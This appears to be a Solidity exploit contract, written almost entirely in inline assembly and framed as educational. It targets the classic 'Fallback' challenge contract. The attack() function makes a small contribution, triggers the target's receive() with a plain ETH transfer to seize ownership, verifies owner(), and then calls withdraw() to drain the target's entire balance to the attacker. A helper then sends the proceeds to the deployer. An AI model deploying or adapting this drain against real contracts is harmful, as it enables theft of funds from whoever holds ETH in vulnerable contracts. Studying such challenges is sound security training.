// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
 * @title FallbackAssemblyAttack
 * @notice Pure assembly implementation of the classic Fallback exploit
 * @dev Every externally callable function drops into assembly for educational purposes
 */
contract FallbackAssemblyAttack {
    // Storage layout:
    // slot 0: owner address
    // slot 1: last targeted fallback contract

    event ExploitInitiated(address indexed target);
    event ContributionMade(uint256 amount);
    event OwnershipClaimed(address indexed newOwner);
    event FundsWithdrawn(uint256 amount);

    /**
     * @notice Record deployer as owner using assembly storage writes
     */
    constructor() {
        assembly {
            sstore(0, caller())
        }
    }

    /**
     * @notice Execute the exploit path against a vulnerable Fallback instance
     * @param target Address of the vulnerable Fallback contract
     */
    function attack(address target) external payable {
        assembly {
            // Gate to the owner so students observe one exploit instance per deployer
            if iszero(eq(caller(), sload(0))) {
                revert(0, 0)
            }

            // Persist the target for later inspection
            sstore(1, target)

            // Require at least 0.0002 ether to cover the two calls
            if lt(callvalue(), 200000000000000) {
                revert(0, 0)
            }

            // Emit ExploitInitiated(target)
            {
                // topic = keccak256("ExploitInitiated(address)")
                let topic := 0x55ffe1743a11276c05c071933b9c3311fd9bac876dbc4532cd2107f2aad5ef78
                mstore(0x00, target)
                log1(0x00, 0x20, topic)
            }

            // ========================================
            // Step 1: call contribute() with 0.0001 ether
            // ========================================

            // Store the ASCII string "contribute()" (12 bytes) in memory
            mstore(0x00, 0x636f6e7472696275746528290000000000000000000000000000000000000000)

            // Hash the signature and overwrite memory with the 32-byte hash
            let sigHash := keccak256(0x00, 12)
            mstore(0x00, sigHash)

            // Execute the call forwarding exactly 0.0001 ether
            let success := call(
                gas(),
                target,
                100000000000000,
                0x00,
                0x04,
                0x00,
                0x00
            )

            if iszero(success) {
                revert(0, 0)
            }

            // Emit ContributionMade(0.0001 ether)
            {
                let topic := 0x1dc1928fb7649d758e45d7b2a31a7e3a1aaf2463b93f43b6a7fea559085cb6fe
                mstore(0x00, 100000000000000)
                log1(0x00, 0x20, topic)
            }

            // ========================================
            // Step 2: trigger receive() via plain ETH transfer
            // ========================================

            success := call(
                gas(),
                target,
                100000000000000,
                0x00,
                0x00,
                0x00,
                0x00
            )

            if iszero(success) {
                revert(0, 0)
            }

            // Emit OwnershipClaimed(address(this))
            {
                let topic := 0xecc717caa84c9daa46bb6b26d28ecb71e7a9c80028f5bac1983acf4f698c863e
                mstore(0x00, address())
                log1(0x00, 0x20, topic)
            }

            // Confirm owner() now reports this contract
            {
                // Store selector for owner() and perform a staticcall
                mstore(0x00, 0x8da5cb5b00000000000000000000000000000000000000000000000000000000)
                success := staticcall(gas(), target, 0x00, 0x04, 0x00, 0x20)
                if iszero(success) {
                    revert(0, 0)
                }

                let reportedOwner := mload(0x00)
                if iszero(eq(reportedOwner, address())) {
                    revert(0, 0)
                }
            }

            // ========================================
            // Step 3: withdraw the entire balance
            // ========================================

            let balanceBefore := selfbalance()

            // Store "withdraw()" (10 bytes) and hash to get the selector
            mstore(0x00, 0x7769746864726177282900000000000000000000000000000000000000000000)
            sigHash := keccak256(0x00, 10)
            mstore(0x00, sigHash)

            success := call(
                gas(),
                target,
                0,
                0x00,
                0x04,
                0x00,
                0x00
            )

            if iszero(success) {
                revert(0, 0)
            }

            let balanceAfter := selfbalance()
            let drained := sub(balanceAfter, balanceBefore)

            // Emit FundsWithdrawn(drained)
            {
                let topic := 0x4a37b25aab49761ecf63117fe82b98d750917451133cf797507bc9fb5b96044a
                mstore(0x00, drained)
                log1(0x00, 0x20, topic)
            }
        }
    }

    /**
     * @notice Withdraw any ETH in the attacker contract back to the owner
     */
    function withdraw() external {
        assembly {
            let owner := sload(0)
            if iszero(eq(caller(), owner)) {
                let ptr := mload(0x40)
                mstore(ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                mstore(add(ptr, 0x04), 0x20)
                mstore(add(ptr, 0x24), 9)
                mstore(add(ptr, 0x44), "Not owner")
                revert(ptr, 0x64)
            }

            let amount := selfbalance()
            let success := call(gas(), owner, amount, 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    /**
     * @notice Expose the last targeted contract for debugging
     */
    function getTarget() external view returns (address target) {
        assembly {
            target := sload(1)
        }
    }

    /**
     * @notice Helper for selector math demonstrations
     */
    function calculateSelector(string memory sig) external pure returns (bytes4 selector) {
        assembly {
            let len := mload(sig)
            let ptr := add(sig, 0x20)
            let hash := keccak256(ptr, len)
            selector := shr(224, hash)
        }
    }

    /**
     * @notice Walk through selector derivation for contribute()
     */
    function demonstrateSelectorCalculation()
        external
        pure
        returns (
            bytes32 step1StringInMemory,
            bytes32 step2HashResult,
            bytes4 step3Selector
        )
    {
        assembly {
            mstore(0x00, 0x636f6e7472696275746528290000000000000000000000000000000000000000)
            step1StringInMemory := mload(0x00)

            let hash := keccak256(0x00, 12)
            mstore(0x00, hash)
            step2HashResult := mload(0x00)

            step3Selector := shr(224, hash)
        }
    }

    /**
     * @notice Accept ETH returned from the exploit target
     */
    receive() external payable {}
}
